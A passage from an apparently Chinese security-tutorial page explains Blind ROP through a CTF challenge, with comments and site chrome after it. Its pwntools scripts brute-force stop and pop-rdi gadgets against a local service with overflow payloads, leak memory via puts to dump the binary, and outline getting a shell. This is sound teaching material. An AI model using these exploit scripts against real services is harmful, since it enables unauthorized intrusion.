address指向一块代码区域，当程序的执行流跳到那段区域之后，程序并不会crash，而是进入了无限循环，这时程序仅仅是hang在了那里，攻击者能够一直保持连接状态。于是，我们把这种类型的gadget，成为stop gadget，这种gadget对于寻找其他gadgets取到了至关重要的作用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">from&nbsp;pwn&nbsp;import&nbsp;*
+io&nbsp;=&nbsp;remote(&quot;127.0.0.1&quot;,10002)
+def&nbsp;log_in_file(addr):
+&nbsp;&nbsp;&nbsp;&nbsp;#f&nbsp;=&nbsp;open(&quot;gadgets.txt&quot;,&#39;a&#39;)
+&nbsp;&nbsp;&nbsp;&nbsp;#f&nbsp;=&nbsp;open(&#39;res.txt&#39;,&#39;a&#39;)
+&nbsp;&nbsp;&nbsp;&nbsp;f&nbsp;=&nbsp;open(&#39;puts.txt&#39;,&#39;a&#39;)
+&nbsp;&nbsp;&nbsp;&nbsp;f.write(&quot;the&nbsp;addr:0x%x\n&quot;%addr)
+&nbsp;&nbsp;&nbsp;&nbsp;f.close()
+def&nbsp;find_stop_gadget(addr):
+&nbsp;&nbsp;&nbsp;&nbsp;io&nbsp;=&nbsp;remote(&quot;127.0.0.1&quot;,10002)
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;&quot;A&quot;*72&nbsp;+&nbsp;p64(addr)
+&nbsp;&nbsp;&nbsp;&nbsp;io.recvuntil(&quot;WelCome&nbsp;my&nbsp;friend,Do&nbsp;you&nbsp;know&nbsp;password?&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;io.sendline(payload)
+&nbsp;&nbsp;&nbsp;&nbsp;try:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.recvline()
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(io.recv()!=None):
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log.info(&quot;alie!&nbsp;at&nbsp;0x%x&quot;&nbsp;%addr)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log_in_file(addr)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.close()
+&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;EOFError&nbsp;as&nbsp;e:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.close()
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log.info(&quot;the&nbsp;connection&nbsp;is&nbsp;close&nbsp;at&nbsp;0x%x&quot;&nbsp;%addr)
+start&nbsp;=&nbsp;0x400000
+while&nbsp;True:
+&nbsp;&nbsp;&nbsp;&nbsp;start&nbsp;+=1
+&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[*]&nbsp;Rand:{0}&quot;.format(start)
+&nbsp;&nbsp;&nbsp;&nbsp;find_stop_gadget(start)
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;start&nbsp;&gt;0x40300000:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">可能会得到多个gadget，找个好用的就可以了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">找useful gadget</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">由于这个题目实质是调用puts函数，不是write函数，所以我们并不需要三个gadget，只需要1个 pop rdi;ret就足够了</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">%rdi，%rsi，%rdx，%rcx，%r8，%r9 用作函数参数，依次对应第1参数，第2参数。。。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">那么如何得到一个 pop rdi;ret呢？我们设想，在64位的ELF中，通常存在一个pop r15;ret 对应的字节码为41 5f c3。后两字节码5f c3对应的汇编为pop rdi;ret。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如果有存在一个地址 addr，满足</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">Payload1&nbsp;=&nbsp;&#39;a&#39;*72&nbsp;+&nbsp;l64(addr-1)+l64(0)+l64(ret)&nbsp;
+Payload2&nbsp;=&nbsp;&#39;a&#39;*72&nbsp;+&nbsp;l64(addr)+l64(0)+l64(ret)&nbsp;
+Payload3&nbsp;=&nbsp;&#39;a&#39;*72&nbsp;+&nbsp;l64(addr+1)&nbsp;+l64(ret)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">ret是一个返回函数，且有输出信息。那么我们就可以得到addr，即pop rdi;ret</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在64位ELF中，通常存在一个pop r15；ret，对应的字节码为41 5f c3。后两字节码5f c3对应的汇编为pop rdi;ret。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如果addr就是指向的5f，那么addr-1就是指向41，Payload1 = &#39;a&#39;72 + l64(addr-1)+l64(0)+l64(0x400711) ，41和5f组成一个指令，pop r15出来，后面接返回地址0x400711，栈平衡满足要求。Payload2 = &#39;a&#39;72 + l64(addr)+l64(0)+l64(0x400711) ，pop rdi出来，也能正常返回。Payload3 = &#39;a&#39;*72 + l64(addr+1) +l64(0x400711) ，addr+1指向c3即ret，直接返回后返回0x400711</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">于是，我先去寻找这么一个ret，返回有输出信息。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">def&nbsp;ret_addr(addr):
+&nbsp;&nbsp;&nbsp;&nbsp;io&nbsp;=&nbsp;remote(&quot;127.0.0.1&quot;,10002)
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;&#39;A&#39;*72&nbsp;+p64(addr)&nbsp;+&nbsp;p64(stop_gadget)
+&nbsp;&nbsp;&nbsp;&nbsp;io.recvuntil(&quot;WelCome&nbsp;my&nbsp;friend,Do&nbsp;you&nbsp;know&nbsp;password?&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;io.sendline(payload)
+&nbsp;&nbsp;&nbsp;&nbsp;try:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.recvline()
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(io.recv()!=None):
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;io.recv()
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;if&nbsp;&quot;No&nbsp;password,&nbsp;no&nbsp;game&quot;&nbsp;in&nbsp;io.recv():
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.info(&quot;find&nbsp;gadgets&nbsp;at&nbsp;0x%x&quot;&nbsp;%&nbsp;addr)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log_in_file(addr)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;[*]&nbsp;the&nbsp;ret&nbsp;addr&nbsp;at&nbsp;0x%x&quot;&nbsp;%&nbsp;(addr)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.close()
+&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;EOFError&nbsp;as&nbsp;e:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.close()
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log.info(&quot;the&nbsp;connection&nbsp;is&nbsp;close&nbsp;at&nbsp;0x%x&quot;&nbsp;%addr)
+start&nbsp;=&nbsp;0x400000
+count&nbsp;=&nbsp;0
+while&nbsp;True:
+&nbsp;&nbsp;&nbsp;&nbsp;start&nbsp;+=&nbsp;1
+&nbsp;&nbsp;&nbsp;&nbsp;ret_addr(start)
+&nbsp;&nbsp;&nbsp;&nbsp;count&nbsp;+=&nbsp;1
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;count&nbsp;&gt;0x1000:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">有了 ret，于是我可以开始寻找 pop rdi;ret了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">def&nbsp;get_useful_gadget(addr):
+&nbsp;&nbsp;&nbsp;&nbsp;io&nbsp;=&nbsp;remote(&quot;127.0.0.1&quot;,10002)
+&nbsp;&nbsp;&nbsp;&nbsp;payload1&nbsp;=&nbsp;&#39;A&#39;*72&nbsp;+p64(addr-1)&nbsp;+&nbsp;p64(0)+p64(ret)+p64(stop_gadget)
+&nbsp;&nbsp;&nbsp;&nbsp;payload2&nbsp;=&nbsp;&#39;A&#39;*72&nbsp;+p64(addr)&nbsp;+&nbsp;p64(0)+p64(ret)+p64(stop_gadget)
+&nbsp;&nbsp;&nbsp;&nbsp;payload3&nbsp;=&nbsp;&#39;A&#39;*72&nbsp;+p64(addr+1)&nbsp;+p64(ret)+p64(stop_gadget)
+&nbsp;&nbsp;&nbsp;&nbsp;io.recvuntil(&quot;WelCome&nbsp;my&nbsp;friend,Do&nbsp;you&nbsp;know&nbsp;password?&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;try:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.sendline(payload1)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;io.recvuntil(&quot;WelCome&nbsp;my&nbsp;friend,Do&nbsp;you&nbsp;know&nbsp;password?&quot;):
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.sendline(payload2)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;io.recvuntil(&quot;WelCome&nbsp;my&nbsp;friend,Do&nbsp;you&nbsp;know&nbsp;password?&quot;):
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.sendline(payload3)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;io.recvuntil(&quot;WelCome&nbsp;my&nbsp;friend,Do&nbsp;you&nbsp;know&nbsp;password?&quot;):
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.info(&quot;find&nbsp;gdgets&nbsp;at&nbsp;0x%x&quot;&nbsp;%&nbsp;addr)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log_in_file(addr)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.close()
+&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;EOFError&nbsp;as&nbsp;e:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.close()
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log.info(&quot;the&nbsp;connection&nbsp;is&nbsp;close&nbsp;at&nbsp;0x%x&quot;&nbsp;%addr)
+start&nbsp;=&nbsp;0x400000
+#&nbsp;count&nbsp;=&nbsp;0
+while&nbsp;True:
+&nbsp;&nbsp;&nbsp;&nbsp;start&nbsp;+=&nbsp;1
+&nbsp;&nbsp;&nbsp;&nbsp;get_useful_gadget(start)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">找到pop rdi;ret了 ，gadget 的需求我们达到了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">dump 程序</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">照理，这个时候我们应该可以开始dump程序了，但是紧接着一个问题来了，我们不知道put_plt的地址。我们知道，puts函数能打印字符串，于是我们设想构造一个payload来验证得到的是不是puts_plt的地址，例如</span></p><pre class="brush:plain;toolbar:false">payload&nbsp;=&nbsp;&#39;A&#39;*72&nbsp;+p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">如果打印前四个\字符为 \x7fELF，则addr为puts_plt。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我找到的是 pop_rdi_ret = 0x4005d6</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">有了 gadget 和put_plt，我们就可以着手dump程序了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先我们需要构造一个leak的函数：</span></p><pre class="brush:plain;toolbar:false">payload&nbsp;=&nbsp;&#39;a&#39;*72&nbsp;+&nbsp;p64(pop_rdi_ret)&nbsp;+p64(addr)&nbsp;+&nbsp;p64(puts_plt)&nbsp;+p64(stop_gadget)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这样就可以开始leak，但是还有一个问题，如果对一个\x00的地址进行leak，返回是没有结果的，因此如果返回没有结果，我们就可以确定这个地址的值为\x00，所以可以设置为\x00然后将地址加1进行dump。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">所以我们需要一个判断：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">if&nbsp;data&nbsp;==&nbsp;&#39;&#39;:
+&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;&#39;\x00&#39;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">基本这样，我们就可以dump文件了，当文件dump下来以后，我们就能很容易的得到一些got信息，那样我们可以更容易的去起shell</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">只要分别从0x400000和0x600000开始dump就可以。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">leak 获取libc</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">当我们已经获取了got表信息后，那么我就可以进一步去leak函数，用search_Libc或者自己收集的libc 库查找相应的libc。那么我就可以进一步查询偏移，就可以构造payload 起shell了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">leak payload 也是相似的，就不重复了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当然，我们这里也可以利用Pwntools的工具 Dynelf 来leak查询system地址，然后找一个地址写入/bin/sh\x00。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最后一步就可以起shell了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">剩下的内容基本和我们一般的leak info 题目是一样的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">与我前面的文章，PlaidCTF 2013: ropasaurusrex的利用方式基本相同，由于篇幅原因就不继续写下去了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">参考链接</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">HCTF 源码 <a href="https://github.com/zh-explorer/hctf2016-brop/blob/master/main.c" _src="https://github.com/zh-explorer/hctf2016-brop/blob/master/main.c">https://github.com/zh-explorer/hctf2016-brop/blob/master/main.c</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">muhe博客 <a href="http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/" _src="http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/">http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">以及队内 师傅的Writeup&nbsp;</span></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/3694.html
+                </p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】现代栈溢出利用技术基础：ROP - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="3694" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/8x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="2798874539" class="response" data-bind-id="2798874539" data-target="13047" user-name="360U2798874539" href="javascript:;">
+                360U2798874539            </a>
+                        <span class="comment-time">2017-04-05 17:54:23</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="2798874539" data-target="13047">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_13047" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">mac上也可以么
+</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/8x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="13041" user-name="o0xmuhe" href="javascript:;">
+                o0xmuhe            </a>
+                        <span class="comment-time">2017-04-05 16:00:51</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="13041">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_13041" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">强的不行</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/2x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="13034" user-name="Mickey牛" href="javascript:;">
+                Mickey牛            </a>
+                        <span class="comment-time">2017-04-05 11:38:31</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="13034">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_13034" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">好一篇大杂烩</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/0x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="13033" user-name="Rj1ng的Ring" href="javascript:;">
+                Rj1ng的Ring            </a>
+                        <span class="comment-time">2017-04-05 11:30:52</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="13033">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_13033" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">太强啦//@在路上的Swing:其实是想介绍各种ROP ...</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/11x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="13031" user-name="在路上的Swing" href="javascript:;">
+                在路上的Swing            </a>
+                        <span class="comment-time">2017-04-05 11:10:52</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="13031">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_13031" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">其实是想介绍各种ROP ...</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+
+        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="3694" data-page="2">查看更多</a>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
